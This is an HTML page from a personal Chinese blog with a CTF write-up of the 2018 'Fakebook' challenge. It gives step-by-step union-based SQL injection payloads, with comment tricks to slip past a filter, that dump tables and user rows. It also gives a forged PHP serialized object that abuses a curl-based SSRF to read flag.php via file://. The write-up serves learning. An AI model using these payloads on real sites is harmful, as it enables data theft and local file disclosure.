@@ -1,0 +1,349 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>寒假练习23和ssrf攻击 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-02-08">2021-02-08</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">寒假练习23和ssrf攻击</h2>
+            <div class="post-meta">
+                emm... 4479 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>今天这道题目依旧是知识点多多。  </p>
+<h1 id="网鼎杯-2018-Fakebook-1"><a href="#网鼎杯-2018-Fakebook-1" class="headerlink" title="[网鼎杯 2018]Fakebook 1"></a>[网鼎杯 2018]Fakebook 1</h1><p>打开题目，发现是一个博客界面，有注册和登录两个选项，先尝试了一波sql注入，发现不行，于是只能先注册一个博客了。<br><img src="https://i.loli.net/2021/02/09/qu9F4gaLeNMIyJv.png" alt="8.png"><br>注册后界面上就显示了我们的博客，发现可以点进去，那就进去看一下试试。<br><img src="https://i.loli.net/2021/02/09/3KuRVLTaFjNBJiq.png" alt="9.png"><br>进去后可以看到url处有view.php?no=1这样的字符，怀疑这里有sql注入。尝试一下。<br><img src="https://i.loli.net/2021/02/09/4v1MZVrk9ycEfIp.png" alt="10.png"><br>判断注入类型，输入no=1 and 1=1正常回显，输入no=1 and 1=2时报错，判断是数值型注入。<br><img src="https://i.loli.net/2021/02/09/QmvRsfO8hugiB5F.png" alt="11.png"><br>接着就是查有几列和哪一个是回显位了。<br>输入no=1 order by 5后发现报错，说明只有四列。<br><img src="https://i.loli.net/2021/02/09/czNt4yqpsge3ZXP.png" alt="12.png"><br>接着输入no=1 union select 1,2,3,4#发现有的字符被过滤了<br><img src="https://i.loli.net/2021/02/09/tZT9zGNid5qO3p8.png" alt="13.png"><br>这里因为不知道什么被过滤了，于是先用了另一种sql注入方法，用双查询注入来通过报错来查看，但是这种方法在查表名时却因为字符串过长而无法查看，用limit 0,1也没有用，于是又换了另外两种报错注入来查，发现concat被过滤了，啊这。。。。。。<br>最后兜兜转转回到原点，只能猜测一手过滤了空格，于是构造这样的payload。<br>no=0/ * * /union/ * * /select/**/1,2,3,4–+<br>发现成功了。。。。界面上第二位有回显。<br><img src="https://i.loli.net/2021/02/09/Yf9ojBlFDACeSz1.png" alt="14.png"><br>看了一下别人的wp，发现只需要在union和select之间加上注释符就可以了，不知道这是过滤了啥。。。。<br>不管怎么说，接下来就是正常的爆库名和表名，列名，和值了。<br>爆库名 </p>
+<blockquote>
+<p>view.php?no=0 union/**/select 1,database(),3,4–+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/09/Qm2Td3J8c5nrkIS.png" alt="15.png"><br>库名为fakebook。  </p>
+<p>爆表名。  </p>
+<blockquote>
+<p>view.php?no=0 union/**/select 1,group _concat(table _name),3,4 from information _schema.tables where table _schema=’fakebook’–+  </p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/09/DaLPiEcMGAfC8Uz.png" alt="16.png"><br>表名为user。  </p>
+<p>爆列名。  </p>
+<blockquote>
+<p>view.php?no=0 union/**/select 1,(select group _concat(column _name) from information _schema.columns where table _name=’users’),3,4–+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/09/aZ7LItKsCfDwhv4.png" alt="68.png"><br>列名为no,username,passwd,data。  </p>
+<p>爆信息。  </p>
+<blockquote>
+<p>view.php?no=0%20union/**/select%201,group _concat(no,’-‘,username,’-‘,passwd,’-‘,data),3,4 from fakebook.users –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/09/KrGIdMHS5N4ovxp.png" alt="1.png"><br>可以看到列名对应的信息。<br>no: 1<br>username: qz<br>passwd:3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2<br>data: O:8:”UserInfo”:3:{s:4:”name”;s:2:”qz”;s:3:”age”;i:18;s:4:”blog”;s:28:”<a href="https://george186.github.io/&quot;;%7D">https://george186.github.io/&quot;;}</a><br>这里让人注意的就是这个序列化后的data。这个序列化很好理解，就是将用户的name，age，blog地址序列化而已，但是怎么利用这个序列化呢？<br>看了别人的wp后才发现有备份文件的。。。。<br>赶紧拿dirsearch扫一下，发现有robots.txt。打开后提示我们有一个user.php.bak备份文件。那就把它下载下来。（其实应该还有一个flag.php,但是我没有扫到。）<br><img src="https://i.loli.net/2021/02/09/Exs87I1Ylyd35JR.png" alt="2.png"><br>好家伙，找到data序列化的源码了，可是后面有一串代码还是第一次见，get($url)函数到底有啥用。只能看一下别人的说法了。  </p>
+<p>看完后得知这里用到了ssrf攻击。这个ssrf攻击在刚开始学ctf的时候就知道了，可是当时了解不深，这次再详细学一下。  </p>
+<hr>
+<h2 id="ssrf攻击"><a href="#ssrf攻击" class="headerlink" title="ssrf攻击"></a>ssrf攻击</h2><p>SSRF(Server-Side Request Forgery，服务器端请求伪造)漏洞，是一种由攻击者构造请求，由服务器端发起请求的安全漏洞，本质上是属于信息泄露漏洞。</p>
+<p>SSRF漏洞原理: 很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side Request Forgery）。一般情况下， SSRF攻击的目标是从外网无法访问的内部系统 。（ 正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统 ）.SSRF 形成的原因大都是由于 服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制 。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。<br>这张图很生动形象了。<br><img src="https://i.loli.net/2021/02/09/FU8N3fVj2nap9gL.png" alt="3.png"><br>简单来说，就是存在一个指定的url地址可以获取另一个主机里的文件，比如html，php，asp，jsp这些文件，它们都存于另一个主机，而要想获取他们，就必须从一个指定的url地址来发送请求获取。过程如下：  </p>
+<p>用户在地址栏输入网址    ——&gt;     向目标网站发送请求 ——-&gt;   目标网站接受请求并在服务器端验证请求是否合法，然后返回用户所需要的页面 ——-&gt;    用户接收页面并在浏览器中显示  </p>
+<p>比如<a target="_blank" rel="noopener" href="http://www.xxx.com/a.php?image=http://www.abc.com/1.jpg%E8%BF%99%E6%A0%B7%E4%B8%80%E4%B8%AA%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%B0%B1%E6%98%AF%E4%BB%8E%E6%8C%87%E5%AE%9A%E7%9A%84url%E5%9C%B0%E5%9D%80%E6%9D%A5%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%EF%BC%8C%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E5%9B%BE%E7%89%87%E3%80%82">www.xxx.com/a.php?image=http://www.abc.com/1.jpg这样一个请求，就是从指定的url地址来发送请求，访问获取另一个网站的图片。</a> </p>
+<p>但是，但是，但是，如果这个image=参数的过滤和限制并不严格的话，那么攻击者就有可能利用这一点来从网站获取更多数据。这也就是ssrf攻击。  </p>
+<p>和ssrf漏洞相关的函数有以下几种：<br>file _get _contents()<br>fsockopen()<br>curl _exec()  </p>
+<p>攻击者利用ssrf可以实现的攻击主要有5种:</p>
+<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
+<p>5.利用file协议读取本地文件等。<br>而这道题用到的就是file协议。  </p>
+<hr>
+<p>了解了ssrf攻击后，再看回这个没见过代码。可以看到，这里面有很多curl函数，curl又是个什么呢？  </p>
+<p>引用一下别人的解释：“curl是一个库，能让你通过URL和许多不同种的服务器进行勾搭、搭讪和深入交流，并且还支持许多协议。并且人家还说了curl可以支持https认证、http post、ftp上传、代理、cookies、简单口令认证等等功能”<br>curl 是一个利用URL语法在命令行方式下工作的文件传输工具。是一个命令行工具。就和cmd和linux里的命令一样。<br>具体的使用命令和参数百度就可以了，这里就是简单了解一下。  </p>
+<p>接着我们一一来看这串代码。  </p>
+<pre><code>
+    function get($url)
+    &#123;
+        $ch = curl_init();//初始化一个curl会话
+
+        curl_setopt($ch, CURLOPT_URL, $url);//设置需要抓取的URL
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上
+        $output = curl_exec($ch); //运行cURL，请求网页，将结果赋予变量$output
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) &#123;
+            return 404;
+        &#125;
+        curl_close($ch);//关闭curl会话
+
+        return $output;//返回输出$output
+    &#125;  
+</code></pre>
+<p>简单来说，就是我们以get方式传参我们的url，再进过序列化后运行，可以看出来，这里就产生了ssrf漏洞。它并没有对我们上传的参数做出严格的过滤，所以我们最后上传后就成了<a target="_blank" rel="noopener" href="http://www.xxx.com/a.php?no=file://......%E8%BF%99%E6%A0%B7%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%B9%B6%E8%A2%AB%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%AA%E4%B8%8D%E8%BF%87%E6%88%91%E4%BB%AC%E4%B8%8A%E4%BC%A0%E7%9A%84url%E8%A2%AB%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%86%E8%80%8C%E5%B7%B2%E3%80%82%E7%BB%93%E5%90%88%E4%B9%8B%E5%89%8D%E6%88%91%E4%BB%AC%E6%9F%A5%E5%88%B0%E7%9A%84%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF%EF%BC%9A">www.xxx.com/a.php?no=file://......这样的格式并被执行，只不过我们上传的url被序列化了而已。结合之前我们查到的字段信息：</a>  </p>
+<blockquote>
+<p>O:8:”UserInfo”:3:{s:4:”name”;s:2:”qz”;s:3:”age”;i:18;s:4:”blog”;s:28:”<a href="https://george186.github.io/&quot;;%7D">https://george186.github.io/&quot;;}</a></p>
+</blockquote>
+<p>可以看出来正常情况下上传的url就是博客地址，而我们就可以对这个url进行伪造，从而进行攻击。<br>而这里我们选择的就是file://协议来读取文件。因为我们已经在报错的回显中得到了文件的路径：/var/www/html/  </p>
+<p>所以我们最终这样构造：  </p>
+<blockquote>
+<p>O:8:”UserInfo”:3:{s:4:”name”;s:1:”1”;s:3:”age”;i:1;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}  </p>
+</blockquote>
+<p>通过前面的sql注入可以得知data在第四列，所以我们把重新构造的序列化信息放在第四列上传。  </p>
+<blockquote>
+<p>view.php?no=0 union/**/select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:1:”1”;s:3:”age”;i:1;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’  </p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/09/B3pjUJNZQsyHaVh.png" alt="4.png"><br>可以看到页面显示的就是我们刚刚构造的信息，那么我们构造的新的url被执行了，也就是我们获取了flag.php文件，接着可以f12查看到flag。  </p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题不仅考了sql注入，还考了ssrf攻击，ssrf攻击是一个不算新的知识点了，但是之前只是简单了解了一下，这道题再次学习了一次，但是还是基础知识。之后还有再深入。<br>附上学习博客。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/107961105?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161277009316780271561207%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161277009316780271561207&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-107961105.pc_search_result_cache&utm_term=get%2528%2529%25E5%2587%25BD%25E6%2595%25B0%25E5%25AD%2598%25E5%259C%25A8SSRF%2528%25E6%259C%258D%25E5%258A%25A1%25E7%25AB%25AF%25E8%25AF%25B7%25E6%25B1%2582%25E4%25BC%25AA%25E9%2580%25A0%2529%25E6%25BC%258F%25E6%25B4%259E%25E3%2580%2582">浅谈“服务端请求伪造攻击SSRF”</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/mz911118/article/details/82981884?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_utm_term-3&spm=1001.2101.3001.4242">CURL</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38088097/article/details/107837104?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161285189216780262565065%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161285189216780262565065&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-11-107837104.pc_search_result_cache&utm_term=curl%25E4%25BB%2580%25E4%25B9%2588%25E6%2584%258F%25E6%2580%259D">curl常用参数介绍</a>  </p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
